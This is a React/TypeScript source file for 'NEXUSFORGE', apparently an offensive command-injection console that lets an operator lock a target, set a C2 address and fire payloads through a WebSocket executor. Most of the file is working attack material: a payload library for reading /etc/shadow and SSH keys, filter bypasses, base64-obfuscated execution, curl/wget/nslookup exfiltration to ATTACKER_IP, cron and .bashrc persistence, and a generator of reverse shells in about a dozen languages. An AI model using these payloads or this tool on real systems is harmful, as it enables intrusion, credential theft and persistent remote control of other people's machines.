import React, { useState, useRef, useEffect, useCallback } from "react";
import {
  useGetHubStatus,
  useGetEngines,
  useGetLogs,
  useClearLogs,
  useGetSuggestions,
  getGetHubStatusQueryKey,
  getGetEnginesQueryKey,
  getGetLogsQueryKey,
  getGetSuggestionsQueryKey,
} from "@workspace/api-client-react";
import { useQueryClient } from "@tanstack/react-query";

const ENGINE_OPTIONS = [
  { value: "bash/bash", label: "Bash" },
  { value: "node/exec", label: "Node exec()" },
  { value: "node/spawn", label: "Node spawn()" },
  { value: "python/subprocess", label: "Python subprocess" },
  { value: "python/os_system", label: "Python os.system" },
  { value: "php/system", label: "PHP system()" },
  { value: "php/exec", label: "PHP exec()" },
  { value: "php/shell_exec", label: "PHP shell_exec()" },
  { value: "java/runtime", label: "Java Runtime.exec" },
  { value: "java/processbuilder", label: "Java ProcessBuilder" },
  { value: "cpp/system", label: "C++ system()" },
  { value: "cpp/popen", label: "C++ popen()" },
  { value: "powershell/powershell", label: "PowerShell" },
];

const PAYLOAD_LIBRARY = [
  {
    cat: "RECON",
    col: "text-lime-400",
    p: [
      "id && uname -a && hostname",
      "cat /proc/version && cat /etc/os-release 2>/dev/null",
      "ps aux | head -20",
      "netstat -tulpn 2>/dev/null || ss -tulpn",
      "env | grep -v '^_' | sort",
      "df -h && free -m",
      "ls -la / && ls -la /home/",
      "cat /proc/net/tcp",
      "find / -name '*.conf' 2>/dev/null | head -10",
    ],
  },
  {
    cat: "FILE READ",
    col: "text-yellow-400",
    p: [
      "cat /etc/passwd",
      "cat /etc/shadow 2>/dev/null",
      "cat /etc/hosts && cat /etc/resolv.conf",
      "cat ~/.ssh/id_rsa 2>/dev/null",
      "cat ~/.bash_history 2>/dev/null | tail -30",
      "find / -name '*.env' 2>/dev/null | head -5 | xargs cat 2>/dev/null",
      "cat /proc/self/environ | tr '\\0' '\\n'",
      "find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null | head -5",
      "cat /var/log/auth.log 2>/dev/null | tail -20",
    ],
  },
  {
    cat: "RCE CHAINS",
    col: "text-red-400",
    p: [
      "id; whoami; uname -a",
      "id && cat /etc/passwd && ls -la /",
      "8.8.8.8 && id",
      "8.8.8.8; id",
      "8.8.8.8 | id",
      "8.8.8.8 || id",
      "`id`",
      "$(id)",
      "$(cat /etc/passwd)",
      "id && ls /root 2>/dev/null",
    ],
  },
  {
    cat: "BYPASS",
    col: "text-orange-400",
    p: [
      "${IFS}id${IFS}",
      "i''d",
      "w'h'o'a'm'i",
      "cat${IFS}/etc/passwd",
      "/bin/c?t /etc/pass*",
      "/???/??t /etc/pass*",
      "cat /e??/pa?sw?",
      "l\\s -la",
      "who$(echo a)mi",
      "`echo id | sh`",
      "$(printf '\\x69\\x64')",
      "bash$IFS-c$IFS'id'",
    ],
  },
  {
    cat: "BLIND TIME",
    col: "text-yellow-300",
    p: [
      "id && sleep 5",
      "ping -c 5 127.0.0.1",
      "id; sleep 7",
      "id||(sleep 9)",
      "bash -c 'sleep 6'",
      "$(sleep 5)",
      "`sleep 5`",
      "id && bash -c 'for i in {1..5}; do sleep 1; done'",
    ],
  },
  {
    cat: "OOB EXFIL",
    col: "text-purple-400",
    p: [
      "id && curl -sk 'http://ATTACKER_IP/?x='$(id|base64 -w0) &",
      "whoami && wget -qO- 'http://ATTACKER_IP/?u='$(whoami) &",
      "nslookup $(whoami).ATTACKER_IP",
      "cat /etc/passwd | curl -sk -X POST http://ATTACKER_IP/ --data-binary @-",
      "curl -sk 'http://ATTACKER_IP/' -d \"$(env|base64 -w0)\" &",
      "curl -sk http://ATTACKER_IP/$(cat /etc/passwd|base64 -w0|head -c200)",
    ],
  },
  {
    cat: "QUANTUM",
    col: "text-cyan-400",
    p: [
      "bash<<<$(base64 -d<<<aWQ=)",
      "echo aWQ= | base64 -d | bash",
      "eval $(echo 'aWQ=' | base64 -d)",
      "bash -c {echo,aWQ=}|{base64,-d}|bash",
      "X=$'\\x69\\x64';$X",
      "$(printf '\\x62\\x61\\x73\\x68') -c id",
      "{echo,d2hvYW1p}|{base64,-d}|{bash,}",
    ],
  },
  {
    cat: "PRIVESC",
    col: "text-red-500",
    p: [
      "sudo -l",
      "find / -perm -4000 -type f 2>/dev/null",
      "find / -perm -2000 -type f 2>/dev/null",
      "find / -writable -type d 2>/dev/null | head -10",
      "cat /etc/crontab && ls /etc/cron* 2>/dev/null",
      "getcap -r / 2>/dev/null",
      "cat /etc/sudoers 2>/dev/null",
      "find / -name 'authorized_keys' 2>/dev/null",
    ],
  },
  {
    cat: "PERSISTENCE",
    col: "text-rose-400",
    p: [
      "echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' >> /etc/crontab",
      "echo 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' >> ~/.bashrc",
      "(crontab -l 2>/dev/null; echo '@reboot bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1') | crontab -",
      "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ATTACKER_PUBKEY' >> ~/.ssh/authorized_keys",
    ],
  },
];

function buildReverseShells(ip: string, port: string) {
  return [
    { name: "Bash TCP", payload: `bash -i >& /dev/tcp/${ip}/${port} 0>&1` },
    { name: "Bash UDP", payload: `bash -i >& /dev/udp/${ip}/${port} 0>&1` },
    { name: "NC Mkfifo", payload: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f` },
    { name: "Python3", payload: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
    { name: "Perl", payload: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'` },
    { name: "PHP", payload: `php -r '$s=fsockopen("${ip}",${port});$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'` },
    { name: "Ruby", payload: `ruby -rsocket -e 'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
    { name: "NC OpenBSD", payload: `nc ${ip} ${port} -e /bin/sh` },
    { name: "PowerShell", payload: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)};$c.Close()` },
    { name: "Socat", payload: `socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}` },
    { name: "AWK", payload: `awk 'BEGIN{s="/inet/tcp/0/${ip}/${port}";for(;;){if((s|&getline c)<=0)break;while((c|getline)>0)print|&s;close(c)}}'` },
  ];
}

export default function MainLab() {
  const queryClient = useQueryClient();

  const [target, setTarget] = useState("");
  const [targetInput, setTargetInput] = useState("");
  const [attackerIp, setAttackerIp] = useState("");
  const [attackerIpInput, setAttackerIpInput] = useState("");
  const [attackerPort, setAttackerPort] = useState("");
  const [attackerPortInput, setAttackerPortInput] = useState("");
  const [attackerArmed, setAttackerArmed] = useState(false);

  const [cmd, setCmd] = useState("");
  const [engine, setEngine] = useState("bash/bash");
  const [mode, setMode] = useState("classic");
  const [output, setOutput] = useState(
    "NEXUSFORGE OS v5.0.0\nReal-Time Command Injection Platform\nWebSocket Streaming Active\n\n"
  );
  const [isRunning, setIsRunning] = useState(false);
  const [score, setScore] = useState(0);
  const [chain, setChain] = useState<string[]>([]);
  const [analytics, setAnalytics] = useState({ total: 0, blind: 0, oob: 0, quantum: 0 });
  const [copyId, setCopyId] = useState<string | null>(null);

  const termRef = useRef<HTMLDivElement>(null);
  const wsRef = useRef<WebSocket | null>(null);

  const { data: hubStatus } = useGetHubStatus({
    query: { refetchInterval: 10000, queryKey: getGetHubStatusQueryKey() },
  });
  const { data: engines } = useGetEngines({
    query: { refetchInterval: 15000, queryKey: getGetEnginesQueryKey() },
  });
  const { data: logs } = useGetLogs({
    query: { refetchInterval: 3000, queryKey: getGetLogsQueryKey() },
  });
  const clearLogs = useClearLogs();

  const suggestParams = { mode, cmd };
  const { data: suggestions, refetch: fetchSuggestions } = useGetSuggestions(suggestParams, {
    query: { enabled: false, queryKey: getGetSuggestionsQueryKey(suggestParams) },
  });

  useEffect(() => {
    if (termRef.current) {
      termRef.current.scrollTop = termRef.current.scrollHeight;
    }
  }, [output]);

  const lockTarget = () => {
    const t = targetInput.trim();
    if (!t) return;
    setTarget(t);
    setOutput(
      prev =>
        prev + `[+] Target acquired: ${t}\n[+] Connection vector established\n\n`
    );
  };

  const armAttacker = () => {
    const ip = attackerIpInput.trim();
    const port = attackerPortInput.trim() || "4444";
    if (!ip) return;
    setAttackerIp(ip);
    setAttackerPort(port);
    setAttackerArmed(true);
    setOutput(
      prev =>
        prev + `[+] C2 configured: ${ip}:${port}\n[+] Reverse shell arsenal loaded\n[+] OOB exfil channels armed\n\nReady for injection.\n\n`
    );
  };

  const handleInject = useCallback(() => {
    if (!cmd.trim() || isRunning) return;

    if (wsRef.current) {
      wsRef.current.close();
      wsRef.current = null;
    }

    const prompt = `root@${target || "nexus"}:~# `;
    setOutput(prev => prev + `${prompt}${cmd}\n`);
    setIsRunning(true);
    setChain(cmd.split(/[;&|`$()]/).map(s => s.trim()).filter(s => s.length > 0 && s.length < 50));

    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${protocol}//${window.location.host}/api/ws/exec`);
    wsRef.current = ws;

    ws.onopen = () => {
      ws.send(
        JSON.stringify({ cmd, engine, mode, target, attackerIp, attackerPort })
      );
    };

    ws.onmessage = (ev) => {
      const msg = JSON.parse(ev.data as string) as {
        type: string;
        chunk?: string;
        message?: string;
        code?: number;
        elapsed?: number;
      };

      if (msg.type === "data" && msg.chunk) {
        setOutput(prev => prev + msg.chunk);
      } else if (msg.type === "end") {
        const elapsed = msg.elapsed ?? 0;
        const bonus = elapsed > 3000 ? 55 : 0;
        setScore(prev => prev + 25 + bonus);
        setAnalytics(prev => ({
          total: prev.total + 1,
          blind: mode === "blind" ? prev.blind + 1 : prev.blind,
          oob: mode === "oob" ? prev.oob + 1 : prev.oob,
          quantum: mode === "quantum" ? prev.quantum + 1 : prev.quantum,
        }));
        setOutput(prev => prev + `\n[exit:${msg.code ?? -1} | ${elapsed}ms]\n\n`);
        setIsRunning(false);
        queryClient.invalidateQueries({ queryKey: ["/api/logs"] });
      } else if (msg.type === "error") {
        setOutput(prev => prev + `[ERROR] ${msg.message}\n\n`);
        setIsRunning(false);
      }
    };

    ws.onerror = () => {
      setOutput(prev => prev + `[WS] Connection error\n\n`);
      setIsRunning(false);
    };

    ws.onclose = () => {
      setIsRunning(false);
      wsRef.current = null;
    };
  }, [cmd, engine, mode, target, attackerIp, attackerPort, isRunning, queryClient]);

  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) handleInject();
    };
    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, [handleInject]);

  const killSession = () => {
    if (wsRef.current) {
      wsRef.current.close();
      wsRef.current = null;
    }
    setIsRunning(false);
    setOutput(prev => prev + "[SIGTERM] Session killed by operator\n\n");
  };

  const clearTerminal = () => {
    setOutput("");
    setChain([]);
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopyId(id);
    setTimeout(() => setCopyId(null), 1500);
  };

  const substitutePayload = (p: string) =>
    p
      .replace(/ATTACKER_IP/g, attackerIp || "ATTACKER_IP")
      .replace(/ATTACKER_PORT/g, attackerPort || "4444");

  const getModeColor = (m: string) => {
    if (m === "classic") return "text-lime-400";
    if (m === "blind") return "text-yellow-400";
    if (m === "oob") return "text-orange-400";
    if (m === "quantum") return "text-purple-400";
    return "text-zinc-400";
  };

  const reverseShells = buildReverseShells(
    attackerIp || "ATTACKER_IP",
    attackerPort || "4444"
  );

  return (
    <div className="min-h-screen bg-black text-zinc-300 font-mono flex flex-col select-none">
      <header className="flex items-center justify-between px-4 py-2 border-b border-red-900/60 bg-zinc-950 shrink-0 flex-wrap gap-2">
        <div className="flex items-center gap-4 flex-wrap">
          <span className="text-red-600 font-bold tracking-widest text-base">NEXUSFORGE</span>
          <span className="text-zinc-700">|</span>
          <div className="flex items-center gap-1.5 text-xs">
            <span
              className={`w-2 h-2 rounded-full ${hubStatus?.status === "online" ? "bg-green-500" : "bg-red-500"}`}
            />
            <span className="text-zinc-500 uppercase">
              {hubStatus?.status === "online" ? "Hub Online" : "Connecting"}
            </span>
          </div>
          {target && (
            <>
              <span className="text-zinc-700">|</span>
              <span className="text-xs text-red-400">TARGET: {target}</span>
            </>
          )}
          {attackerArmed && (
            <>
              <span className="text-zinc-700">|</span>
              <span className="text-xs text-purple-400">
                C2: {attackerIp}:{attackerPort}
              </span>
            </>
          )}
        </div>
        <div className="flex items-center gap-3">
          {isRunning && (
            <button
              onClick={killSession}
              className="text-xs px-3 py-1 border border-red-700 text-red-500 hover:bg-red-950/40 uppercase"
            >
              KILL
            </button>
          )}
          <div className="text-red-500 font-bold border border-red-900 px-3 py-1 text-xs">
            SCORE: {String(score).padStart(6, "0")}
          </div>
        </div>
      </header>

      <div className="flex-1 flex flex-col md:flex-row overflow-hidden min-h-0">
        <aside className="w-full md:w-72 border-r border-red-900/40 bg-zinc-950 flex flex-col overflow-y-auto shrink-0">
          <div className="p-3 space-y-4">

            <div className="space-y-2">
              <div className="text-xs text-red-500 uppercase tracking-wider flex items-center gap-2">
                <span className={`w-1.5 h-1.5 rounded-full ${target ? "bg-green-500" : "bg-red-500"}`} />
                Target Acquisition
              </div>
              {!target ? (
                <div className="space-y-1.5">
                  <input
                    type="text"
                    value={targetInput}
                    onChange={e => setTargetInput(e.target.value)}
                    onKeyDown={e => e.key === "Enter" && lockTarget()}
                    placeholder="192.168.1.1 or target.host"
                    className="w-full bg-black border border-red-900 px-2 py-1.5 text-xs text-lime-400 placeholder-zinc-700 focus:outline-none focus:border-red-500"
                    autoComplete="off"
                  />
                  <button
                    onClick={lockTarget}
                    className="w-full bg-red-950/60 border border-red-800 text-red-400 text-xs py-1.5 uppercase hover:bg-red-900/40"
                  >
                    Lock Target
                  </button>
                </div>
              ) : (
                <div className="flex items-center justify-between bg-black border border-green-900/40 px-2 py-1.5">
                  <span className="text-green-400 text-xs truncate">{target}</span>
                  <button
                    onClick={() => { setTarget(""); setTargetInput(""); setAttackerArmed(false); }}
                    className="text-zinc-600 hover:text-red-400 text-xs ml-2"
                  >
                    X
                  </button>
                </div>
              )}
            </div>

            {target && (
              <div className="space-y-2">
                <div className="text-xs text-red-500 uppercase tracking-wider flex items-center gap-2">
                  <span className={`w-1.5 h-1.5 rounded-full ${attackerArmed ? "bg-green-500" : "bg-yellow-500"}`} />
                  C2 Configuration
                </div>
                {!attackerArmed ? (
                  <div className="space-y-1.5">
                    <input
                      type="text"
                      value={attackerIpInput}
                      onChange={e => setAttackerIpInput(e.target.value)}
                      placeholder="Attacker IP"
                      className="w-full bg-black border border-zinc-800 px-2 py-1.5 text-xs text-purple-300 placeholder-zinc-700 focus:outline-none focus:border-purple-700"
                      autoComplete="off"
                    />
                    <input
                      type="text"
                      value={attackerPortInput}
                      onChange={e => setAttackerPortInput(e.target.value)}
                      onKeyDown={e => e.key === "Enter" && armAttacker()}
                      placeholder="Listen Port (default 4444)"
                      className="w-full bg-black border border-zinc-800 px-2 py-1.5 text-xs text-purple-300 placeholder-zinc-700 focus:outline-none focus:border-purple-700"
                      autoComplete="off"
                    />
                    <button
                      onClick={armAttacker}
                      className="w-full bg-purple-950/50 border border-purple-800 text-purple-400 text-xs py-1.5 uppercase hover:bg-purple-900/40"
                    >
                      Arm C2
                    </button>
                  </div>
                ) : (
                  <div className="flex items-center justify-between bg-black border border-purple-900/40 px-2 py-1.5">
                    <span className="text-purple-400 text-xs">{attackerIp}:{attackerPort}</span>
                    <button
                      onClick={() => { setAttackerArmed(false); setAttackerIpInput(attackerIp); setAttackerPortInput(attackerPort); }}
                      className="text-zinc-600 hover:text-red-400 text-xs ml-2"
                    >
                      X
                    </button>
                  </div>
                )}
              </div>
            )}

            {target && (
              <>
                <div className="space-y-1.5">
                  <label className="text-xs text-red-500 uppercase tracking-wider block">Engine</label>
                  <select
                    value={engine}
                    onChange={e => setEngine(e.target.value)}
                    className="w-full bg-black border border-red-900 px-2 py-1.5 text-xs text-zinc-300 focus:outline-none focus:border-red-500"
                  >
                    {ENGINE_OPTIONS.map(opt => {
                      const key = opt.value.split("/")[0] as keyof typeof engines;
                      const avail = engines ? (engines[key] !== false) : true;
                      return (
                        <option key={opt.value} value={opt.value}>
                          {opt.label}{!avail ? " [N/A]" : ""}
                        </option>
                      );
                    })}
                  </select>
                </div>

                <div className="space-y-1.5">
                  <label className="text-xs text-red-500 uppercase tracking-wider block">Mode</label>
                  <div className="grid grid-cols-2 gap-1">
                    {["classic", "blind", "oob", "quantum"].map(m => (
                      <button
                        key={m}
                        onClick={() => setMode(m)}
                        className={`py-1.5 border text-xs uppercase transition-colors ${mode === m ? "border-red-600 text-red-400 bg-red-950/30" : "border-zinc-800 text-zinc-600 hover:border-zinc-600 hover:text-zinc-400"}`}
                      >
                        {m}
                      </button>
                    ))}
                  </div>
                </div>

                <div className="space-y-1.5">
                  <label className="text-xs text-red-500 uppercase tracking-wider block">Payload</label>
                  <textarea
                    value={cmd}
                    onChange={e => setCmd(e.target.value)}
                    onKeyDown={e => {
                      if (e.key === "Enter" && !e.shiftKey) {
                        e.preventDefault();
                        handleInject();
                      }
                    }}
                    className="w-full h-20 bg-black border border-red-900 px-2 py-1.5 text-lime-400 font-mono text-xs focus:outline-none focus:border-red-500 resize-none"
                    placeholder="Enter payload... (Enter to fire)"
                    spellCheck={false}
                  />
                  <div className="flex gap-1.5">
                    <button
                      onClick={handleInject}
                      disabled={isRunning || !cmd.trim()}
                      className="flex-1 bg-red-900 text-white font-bold py-2 text-xs uppercase hover:bg-red-800 disabled:opacity-40 transition-colors"
                    >
                      {isRunning ? "STREAMING..." : "INJECT"}
                    </button>
                    <button
                      onClick={() => fetchSuggestions()}
                      className="px-2 bg-zinc-900 border border-zinc-800 text-zinc-500 text-xs uppercase hover:bg-zinc-800 transition-colors"
                      title="AI Suggestions"
                    >
                      AI
                    </button>
                  </div>
                  {suggestions && suggestions.length > 0 && (
                    <div className="space-y-1 mt-1">
                      {suggestions.map((s, i) => (
                        <div
                          key={i}
                          onClick={() => setCmd(s)}
                          className="text-[10px] bg-zinc-900 text-lime-400 px-1.5 py-1 border border-zinc-800 cursor-pointer hover:bg-zinc-800 truncate"
                          title={s}
                        >
                          {s}
                        </div>
                      ))}
                    </div>
                  )}
                </div>

                {attackerArmed && (
                  <div className="space-y-1.5">
                    <label className="text-xs text-red-500 uppercase tracking-wider block">Reverse Shells</label>
                    <div className="space-y-1.5 max-h-48 overflow-y-auto pr-0.5">
                      {reverseShells.map((rs, i) => (
                        <div key={i} className="border border-zinc-800 bg-black px-2 py-1.5">
                          <div className="flex justify-between items-center mb-0.5">
                            <span className="text-[10px] text-zinc-500">{rs.name}</span>
                            <div className="flex gap-1.5">
                              <button
                                onClick={() => setCmd(rs.payload)}
                                className="text-[10px] text-zinc-600 hover:text-lime-400"
                              >
                                USE
                              </button>
                              <button
                                onClick={() => copyToClipboard(rs.payload, `rs-${i}`)}
                                className={`text-[10px] ${copyId === `rs-${i}` ? "text-green-400" : "text-zinc-600 hover:text-red-400"}`}
                              >
                                {copyId === `rs-${i}` ? "COPIED" : "COPY"}
                              </button>
                            </div>
                          </div>
                          <div className="text-[9px] text-zinc-600 truncate font-mono">{rs.payload}</div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                <div className="space-y-1.5">
                  <label className="text-xs text-red-500 uppercase tracking-wider block">Payload Library</label>
                  <div className="space-y-2 max-h-80 overflow-y-auto pr-0.5">
                    {PAYLOAD_LIBRARY.map((lib, i) => (
                      <div key={i}>
                        <div className={`text-[10px] uppercase mb-1 ${lib.col}`}>{lib.cat}</div>
                        <div className="flex flex-wrap gap-1">
                          {lib.p.map((p, j) => (
                            <button
                              key={j}
                              onClick={() => setCmd(substitutePayload(p))}
                              className="px-1.5 py-0.5 bg-zinc-900 hover:bg-zinc-800 text-[9px] border border-zinc-800 text-zinc-400 hover:text-zinc-200 max-w-full truncate"
                              style={{ maxWidth: "100%" }}
                              title={substitutePayload(p)}
                            >
                              {p.length > 28 ? p.slice(0, 28) + "…" : p}
                            </button>
                          ))}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </>
            )}
          </div>
        </aside>

        <main className="flex-1 flex flex-col min-w-0 min-h-0">
          <div className="flex-1 flex flex-col min-h-0">
            <div className="flex-1 flex flex-col bg-black border-b border-red-900/40 min-h-0">
              <div className="flex items-center justify-between bg-zinc-950 border-b border-zinc-900 px-3 py-1.5 shrink-0">
                <div className="flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-red-500" />
                  <span className="w-2.5 h-2.5 rounded-full bg-yellow-500" />
                  <span className="w-2.5 h-2.5 rounded-full bg-green-500" />
                  <span className="text-xs text-zinc-500 ml-2">
                    root@{target || "nexus"}:~#
                  </span>
                  {isRunning && (
                    <span className="text-xs text-red-400 animate-pulse ml-2">STREAMING</span>
                  )}
                </div>
                <div className="flex items-center gap-2">
                  <span className={`text-xs uppercase ${getModeColor(mode)}`}>{mode}</span>
                  <span className="text-zinc-700">|</span>
                  <button
                    onClick={clearTerminal}
                    className="text-xs text-zinc-600 hover:text-red-400 uppercase"
                  >
                    CLEAR
                  </button>
                </div>
              </div>

              <div
                ref={termRef}
                className="flex-1 overflow-y-auto p-3 font-mono text-xs leading-relaxed"
              >
                <pre className="whitespace-pre-wrap break-words text-lime-400">{output}</pre>
                {isRunning && (
                  <span className="inline-block w-2 h-3.5 bg-lime-400 animate-pulse align-text-bottom" />
                )}
              </div>
            </div>

            {chain.length > 1 && (
              <div className="border-b border-red-900/40 bg-zinc-950 px-3 py-2 flex items-center gap-2 overflow-x-auto shrink-0">
                <span className="text-[10px] text-red-500 uppercase mr-1 shrink-0">Chain:</span>
                {chain.map((c, i) => (
                  <React.Fragment key={i}>
                    <div className="px-2 py-0.5 bg-red-950 border border-red-900 text-red-400 text-[10px] whitespace-nowrap shrink-0">
                      {c}
                    </div>
                    {i < chain.length - 1 && <span className="text-zinc-700 shrink-0">→</span>}
                  </React.Fragment>
                ))}
              </div>
            )}
          </div>

          <div className="h-52 bg-zinc-950 flex gap-3 p-3 shrink-0 overflow-hidden">
            <div className="flex-1 flex flex-col min-w-0 overflow-hidden">
              <div className="flex justify-between items-center mb-1.5 shrink-0">
                <span className="text-xs text-red-500 uppercase">Live Injection Logs</span>
                <button
                  onClick={() => clearLogs.mutate()}
                  className="text-[10px] text-zinc-600 hover:text-red-400 uppercase"
                >
                  CLEAR
                </button>
              </div>
              <div className="flex-1 overflow-y-auto border border-zinc-900 bg-black min-h-0">
                <table className="w-full text-[10px] text-left">
                  <thead className="bg-zinc-900 text-zinc-500 sticky top-0">
                    <tr>
                      <th className="px-2 py-1">TIME</th>
                      <th className="px-2 py-1">MODE</th>
                      <th className="px-2 py-1">ENGINE</th>
                      <th className="px-2 py-1">COMMAND</th>
                      <th className="px-2 py-1">MS</th>
                    </tr>
                  </thead>
                  <tbody>
                    {logs?.map(l => (
                      <tr key={l.id} className="border-t border-zinc-900 hover:bg-zinc-900/30">
                        <td className="px-2 py-1 text-zinc-600">{new Date(l.timestamp).toLocaleTimeString()}</td>
                        <td className="px-2 py-1">
                          <span className={`uppercase ${getModeColor(l.mode)}`}>{l.mode}</span>
                        </td>
                        <td className="px-2 py-1 text-zinc-500">{l.engine}</td>
                        <td className="px-2 py-1 font-mono truncate max-w-[180px] text-zinc-300" title={l.command}>
                          {l.command}
                        </td>
                        <td className="px-2 py-1 text-zinc-600">{l.responseTime}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            <div className="w-40 flex flex-col border border-zinc-900 bg-black p-2.5 shrink-0">
              <span className="text-[10px] text-red-500 uppercase mb-2">Session Stats</span>
              <div className="space-y-1.5 text-xs flex-1">
                <div className="flex justify-between">
                  <span className="text-zinc-600">TOTAL</span>
                  <span className="text-zinc-300">{analytics.total}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-zinc-600">BLIND</span>
                  <span className="text-yellow-400">{analytics.blind}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-zinc-600">OOB</span>
                  <span className="text-orange-400">{analytics.oob}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-zinc-600">QUANTUM</span>
                  <span className="text-purple-400">{analytics.quantum}</span>
                </div>
                <div className="border-t border-zinc-900 mt-2 pt-2 flex justify-between">
                  <span className="text-zinc-600">SCORE</span>
                  <span className="text-red-400 font-bold">{score}</span>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}
